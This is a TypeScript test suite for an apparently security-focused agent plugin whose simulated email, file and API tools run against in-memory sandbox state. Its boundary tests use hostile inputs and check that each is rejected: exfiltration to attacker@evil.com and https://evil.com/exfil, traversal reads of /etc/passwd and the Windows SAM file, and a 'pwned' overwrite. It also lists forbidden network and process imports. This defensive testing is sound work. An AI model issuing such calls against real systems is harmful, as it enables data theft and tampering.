// P0-Fix2: Updated to use real SDK tool shape — 5-arg execute(toolCallId,
// params, signal, onUpdate, ctx) with per-session runtime resolver.
// P3-ISSUE1: Compiled JS entry for real OpenClaw plugin install.

import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { readFile, readdir, stat } from "node:fs/promises";
import test from "node:test";
import { promisify } from "node:util";

import { registerTrack1Tools } from "../src/tool-adapters.ts";
import type { CampaignToolRuntimeResolver } from "../src/tool-adapters.ts";
import { SessionToolRuntimeRegistry } from "../src/plugin.ts";
import {
  makeCampaignToolRuntime,
  makeRecordingPluginApi,
  nextCallId
} from "./fixtures/openclaw-plugin.fixture.ts";

const execFileAsync = promisify(execFile);

// -- helper: wrap a single runtime in a resolver ---------------------------
// P1-Fix5: registerTrack1Tools now takes a CampaignToolRuntimeResolver
// instead of a fixed runtime. Each tool execute looks up the runtime via
// ctx.sessionId.

function makeResolver(runtime: {
  session_id: string;
}): CampaignToolRuntimeResolver {
  const registry = new SessionToolRuntimeRegistry();
  registry.register(runtime.session_id, runtime as never);
  return registry;
}

// -- manifest + registration -----------------------------------------------

test("REQ-T1-DEMO-010 plugin registers exactly four native simulated tools", () => {
  const runtime = makeCampaignToolRuntime();
  const api = makeRecordingPluginApi();
  registerTrack1Tools(api, makeResolver(runtime));

  assert.deepEqual(
    api.tools.map((tool) => tool.name).sort(),
    ["call_api", "read_file", "send_email", "write_file"]
  );
  assert.equal(new Set(api.tools.map((tool) => tool.name)).size, 4);
  for (const tool of api.tools) {
    assert.equal(tool.parameters.additionalProperties, false);
    // P0-Fix2: real SDK AnyAgentTool requires a non-empty label
    assert.equal(typeof tool.label, "string");
    assert.ok((tool.label as string).length > 0);
  }
});

test("REQ-T1-DEMO-010 manifest has no unknown key and exactly four tool contracts", async () => {
  const manifest = JSON.parse(
    await readFile(
      new URL("../openclaw.plugin.json", import.meta.url),
      "utf8"
    )
  ) as Record<string, unknown>;

  const allowedKeys = new Set([
    "id",
    "name",
    "version",
    "description",
    "main",
    "activation",
    "contracts",
    "configSchema"
  ]);
  for (const key of Object.keys(manifest)) {
    assert.equal(allowedKeys.has(key), true, `unknown manifest key: ${key}`);
  }
  assert.equal(manifest.id, "agent-security-track1");
  assert.equal(manifest.main, "./dist/index.js");
  const contracts = manifest.contracts as { tools: string[] };
  assert.deepEqual(
    [...contracts.tools].sort(),
    ["call_api", "read_file", "send_email", "write_file"]
  );
});

test("REQ-T1-DEMO-010 configSchema rejects unknown properties and marks token writeOnly", async () => {
  const manifest = JSON.parse(
    await readFile(
      new URL("../openclaw.plugin.json", import.meta.url),
      "utf8"
    )
  ) as {
    configSchema: {
      type: string;
      additionalProperties: boolean;
      required: string[];
      properties: Record<string, { type?: string; writeOnly?: boolean; default?: string }>;
    };
  };
  assert.equal(manifest.configSchema.type, "object");
  assert.equal(manifest.configSchema.additionalProperties, false);
  assert.deepEqual(
    [...manifest.configSchema.required].sort(),
    ["ingestEndpoint", "ingestToken"]
  );
  assert.equal(manifest.configSchema.properties.ingestToken.writeOnly, true);
  assert.equal(
    manifest.configSchema.properties.ingestEndpoint.default,
    "http://backend:3001/internal/track1/campaigns"
  );
});

// -- compiled JS entry (P3-ISSUE1) -----------------------------------------

test("REQ-T1-DEMO-010 openclaw.extensions points to compiled JS entry in dist/", async () => {
  const pkg = JSON.parse(
    await readFile(
      new URL("../package.json", import.meta.url),
      "utf8"
    )
  );
  const extensions = pkg.openclaw?.extensions;
  assert.ok(Array.isArray(extensions), "openclaw.extensions must be an array");
  assert.ok(extensions.length > 0, "openclaw.extensions must not be empty");
  for (const entry of extensions) {
    // Must point to a .js file in dist/
    assert.ok(
      entry.endsWith(".js"),
      `extension entry must be a compiled .js file, got: ${entry}`
    );
    assert.ok(
      entry.startsWith("./dist/") || entry.startsWith("dist/"),
      `extension entry must be in dist/, got: ${entry}`
    );
  }
  assert.equal(pkg.scripts?.prepack, "npm run build");
  assert.deepEqual(pkg.files, ["dist", "openclaw.plugin.json"]);
});

test("REQ-T1-DEMO-010 published bundle has no install-time runtime dependencies", async () => {
  const pkg = JSON.parse(
    await readFile(new URL("../package.json", import.meta.url), "utf8")
  );
  assert.deepEqual(pkg.dependencies ?? {}, {});
  assert.equal(pkg.devDependencies.openclaw, "2026.6.10");
  assert.equal(pkg.devDependencies.typebox, "1.1.38");
  assert.equal(pkg.devDependencies.esbuild, "0.27.7");
});

test("REQ-T1-DEMO-010 build script produces valid compiled JS entry", async () => {
  const integrationRoot = new URL("../", import.meta.url);
  await execFileAsync(process.execPath, ["scripts/build.mjs"], {
    cwd: integrationRoot
  });

  const distUrl = new URL("../dist/index.js", import.meta.url);
  const st = await stat(distUrl);
  assert.ok(st.isFile());
  assert.ok(st.size > 0);
  assert.deepEqual(
    (await readdir(new URL("../dist/", import.meta.url))).sort(),
    ["index.js"]
  );

  const built = await readFile(
    distUrl,
    "utf8"
  );
  // The bundle must export the `registerTrack1Plugin` function
  assert.ok(
    built.includes("registerTrack1Plugin"),
    "compiled bundle must export registerTrack1Plugin"
  );
  // Must not contain TypeScript-specific syntax
  assert.equal(
    built.includes("import type"),
    false,
    "compiled bundle must not contain TypeScript type-only imports"
  );
  // The openclaw SDK import must be a bare-specifier import (external),
  // not bundled internal code. The string "openclaw/plugin-sdk/plugin-entry"
  // should only appear in `import { definePluginEntry } from "openclaw/..."`.
  const importLines = built.match(/import\s+.*from\s+["'].*openclaw.*["']/g);
  assert.ok(importLines !== null, "compiled bundle must import openclaw externally");
  for (const line of importLines) {
    assert.ok(
      line.startsWith("import"),
      `openclaw import must be a bare import statement: ${line}`
    );
  }

  const runtime = await import(`${distUrl.href}?t=${Date.now()}`);
  assert.equal(typeof runtime.default, "object");
  assert.equal(typeof runtime.default.register, "function");
});

// -- forbidden imports -----------------------------------------------------

test("REQ-T1-DEMO-010 tool adapters cannot import real-world side-effect surfaces", async () => {
  const source = await readFile(
    new URL("../src/tool-adapters.ts", import.meta.url),
    "utf8"
  );
  const forbidden = [
    "node:fs",
    "node:child_process",
    "node:net",
    "node:http",
    "node:https",
    "fetch(",
    "nodemailer",
    "playwright",
    "puppeteer",
    "mcp"
  ];
  for (const token of forbidden) {
    assert.equal(source.includes(token), false, token);
  }
});

// -- send_email: positive + boundary --------------------------------------

test("REQ-T1-DEMO-010 send_email appends one item to in-memory outbox", async () => {
  const runtime = makeCampaignToolRuntime();
  const api = makeRecordingPluginApi();
  registerTrack1Tools(api, makeResolver(runtime));

  const tool = api.tools.find((t) => t.name === "send_email")!;
  const callId = nextCallId();
  // P0-Fix2: real SDK execute(toolCallId, params, signal, onUpdate, ctx)
  const result = await tool.execute(
    callId,
    {
      recipient: "user@local.invalid",
      subject: "Test subject",
      body: "Test body"
    },
    undefined,
    undefined,
    { sessionId: runtime.session_id, toolCallId: callId }
  );

  const snapshot = runtime.state.snapshot();
  assert.equal(snapshot.outbox.length, 1);
  assert.equal(snapshot.outbox[0]!.recipient, "user@local.invalid");

  const payload = result as { content: Array<{ type: string; text: string }> };
  assert.equal(payload.content[0]!.type, "text");
  // Safe JSON must not echo the body
  const safeJson = payload.content[0]!.text;
  assert.equal(safeJson.includes("Test body"), false);
  assert.equal(safeJson.includes("simulated_success"), true);
});

test("REQ-T1-DEMO-010 send_email rejects non-local recipient", async () => {
  const runtime = makeCampaignToolRuntime();
  const api = makeRecordingPluginApi();
  registerTrack1Tools(api, makeResolver(runtime));

  const tool = api.tools.find((t) => t.name === "send_email")!;
  const callId = nextCallId();
  const result = await tool.execute(
    callId,
    {
      recipient: "attacker@evil.com",
      subject: "Bypass",
      body: "Payload"
    },
    undefined,
    undefined,
    { sessionId: runtime.session_id, toolCallId: callId }
  );

  const snapshot = runtime.state.snapshot();
  assert.equal(snapshot.outbox.length, 0);
  const safeJson = (result as { content: Array<{ text: string }> }).content[0]!.text;
  assert.equal(safeJson.includes("rejected"), true);
});

// -- read_file: positive + boundary ---------------------------------------

test("REQ-T1-DEMO-010 read_file returns seeded virtual file content", async () => {
  const runtime = makeCampaignToolRuntime({
    files: { "sandbox://fixtures/seeded.txt": "seeded-content" }
  });
  const api = makeRecordingPluginApi();
  registerTrack1Tools(api, makeResolver(runtime));

  const tool = api.tools.find((t) => t.name === "read_file")!;
  const callId = nextCallId();
  const result = await tool.execute(
    callId,
    { path: "sandbox://fixtures/seeded.txt" },
    undefined,
    undefined,
    { sessionId: runtime.session_id, toolCallId: callId }
  );

  const safeJson = (result as { content: Array<{ text: string }> }).content[0]!.text;
  assert.equal(safeJson.includes("simulated_success"), true);
  // Safe JSON must not echo the file content
  assert.equal(safeJson.includes("seeded-content"), false);
});

test("REQ-T1-DEMO-010 read_file rejects traversal and unknown host paths", async () => {
  const runtime = makeCampaignToolRuntime();
  const api = makeRecordingPluginApi();
  registerTrack1Tools(api, makeResolver(runtime));

  const tool = api.tools.find((t) => t.name === "read_file")!;
  for (const path of [
    "sandbox://fixtures/../etc/passwd",
    "/etc/passwd",
    "C:\\Windows\\System32\\config\\SAM"
  ]) {
    const callId = nextCallId();
    const result = await tool.execute(
      callId,
      { path },
      undefined,
      undefined,
      { sessionId: runtime.session_id, toolCallId: callId }
    );
    const safeJson = (result as { content: Array<{ text: string }> }).content[0]!.text;
    assert.equal(safeJson.includes("rejected"), true, path);
  }
});

// -- write_file: positive + boundary --------------------------------------

test("REQ-T1-DEMO-010 write_file only changes virtual file state", async () => {
  const runtime = makeCampaignToolRuntime();
  const api = makeRecordingPluginApi();
  registerTrack1Tools(api, makeResolver(runtime));

  const tool = api.tools.find((t) => t.name === "write_file")!;
  const callId = nextCallId();
  const result = await tool.execute(
    callId,
    {
      path: "sandbox://fixtures/output.txt",
      content: "written-content"
    },
    undefined,
    undefined,
    { sessionId: runtime.session_id, toolCallId: callId }
  );

  const snapshot = runtime.state.snapshot();
  assert.equal(snapshot.files["sandbox://fixtures/output.txt"], "written-content");
  const safeJson = (result as { content: Array<{ text: string }> }).content[0]!.text;
  assert.equal(safeJson.includes("simulated_success"), true);
  assert.equal(safeJson.includes("written-content"), false);
});

test("REQ-T1-DEMO-010 write_file rejects host paths", async () => {
  const runtime = makeCampaignToolRuntime();
  const api = makeRecordingPluginApi();
  registerTrack1Tools(api, makeResolver(runtime));

  const tool = api.tools.find((t) => t.name === "write_file")!;
  const callId = nextCallId();
  const result = await tool.execute(
    callId,
    {
      path: "/etc/passwd",
      content: "pwned"
    },
    undefined,
    undefined,
    { sessionId: runtime.session_id, toolCallId: callId }
  );
  const safeJson = (result as { content: Array<{ text: string }> }).content[0]!.text;
  assert.equal(safeJson.includes("rejected"), true);
  assert.equal(runtime.state.snapshot().files["/etc/passwd"], undefined);
});

// -- call_api: positive + boundary ----------------------------------------

test("REQ-T1-DEMO-010 call_api returns fixed mock route", async () => {
  const runtime = makeCampaignToolRuntime({
    api_routes: [
      {
        endpoint: "mock://api.local/status",
        method: "GET",
        status_code: 200,
        body: { status: "ok" }
      }
    ]
  });
  const api = makeRecordingPluginApi();
  registerTrack1Tools(api, makeResolver(runtime));

  const tool = api.tools.find((t) => t.name === "call_api")!;
  const callId = nextCallId();
  const result = await tool.execute(
    callId,
    { endpoint: "mock://api.local/status", method: "GET" },
    undefined,
    undefined,
    { sessionId: runtime.session_id, toolCallId: callId }
  );

  const safeJson = (result as { content: Array<{ text: string }> }).content[0]!.text;
  assert.equal(safeJson.includes("simulated_success"), true);
  assert.equal(safeJson.includes("200"), true);
});

test("REQ-T1-DEMO-010 call_api rejects arbitrary URLs", async () => {
  const runtime = makeCampaignToolRuntime();
  const api = makeRecordingPluginApi();
  registerTrack1Tools(api, makeResolver(runtime));

  const tool = api.tools.find((t) => t.name === "call_api")!;
  const callId = nextCallId();
  const result = await tool.execute(
    callId,
    { endpoint: "https://evil.com/exfil", method: "GET" },
    undefined,
    undefined,
    { sessionId: runtime.session_id, toolCallId: callId }
  );
  const safeJson = (result as { content: Array<{ text: string }> }).content[0]!.text;
  assert.equal(safeJson.includes("rejected"), true);
});

// -- campaign isolation ----------------------------------------------------

test("REQ-T1-DEMO-010 two runtimes with different campaign ids cannot observe each other", async () => {
  const runtimeA = makeCampaignToolRuntime({
    campaign_id: "campaign:A",
    agent_id: "agent:A",
    attempt_id: "attempt:A",
    session_id: "session:track1:A",
    files: { "sandbox://fixtures/shared.txt": "from-A" }
  });
  const runtimeB = makeCampaignToolRuntime({
    campaign_id: "campaign:B",
    agent_id: "agent:B",
    attempt_id: "attempt:B",
    session_id: "session:track1:B"
  });

  const apiA = makeRecordingPluginApi();
  const apiB = makeRecordingPluginApi();
  registerTrack1Tools(apiA, makeResolver(runtimeA));
  registerTrack1Tools(apiB, makeResolver(runtimeB));

  // A writes to its outbox
  const callIdA = nextCallId();
  await apiA.tools
    .find((t) => t.name === "send_email")!
    .execute(
      callIdA,
      { recipient: "a@local.invalid", subject: "A", body: "from-A" },
      undefined,
      undefined,
      { sessionId: runtimeA.session_id, toolCallId: callIdA }
    );

  // B must not see A's outbox
  assert.equal(runtimeB.state.snapshot().outbox.length, 0);
  assert.equal(runtimeA.state.snapshot().outbox.length, 1);

  // B cannot read A's files
  const callIdB = nextCallId();
  const readResult = await apiB.tools
    .find((t) => t.name === "read_file")!
    .execute(
      callIdB,
      { path: "sandbox://fixtures/shared.txt" },
      undefined,
      undefined,
      { sessionId: runtimeB.session_id, toolCallId: callIdB }
    );
  const safeJson = (readResult as { content: Array<{ text: string }> }).content[0]!.text;
  assert.equal(safeJson.includes("rejected"), true);
  assert.equal(safeJson.includes("from-A"), false);
});
